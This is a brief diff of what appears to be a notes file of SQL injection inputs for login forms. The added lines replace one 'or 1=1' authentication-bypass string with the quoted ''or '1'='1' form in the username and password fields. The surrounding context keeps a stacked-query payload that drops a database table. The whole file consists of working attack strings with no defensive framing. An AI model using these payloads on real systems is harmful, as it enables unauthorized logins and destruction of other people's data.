@@ -1,5 +1,5 @@
-username: 111444 or 1=1; --+
-password: ANY WORDS
+username:(space here) 'or '1'='1
+password:(space here) 'or '1'='1
 
 username: ANYWORDS;drop table ANY_TABLE if exists; --+
 password: ANY WORDS
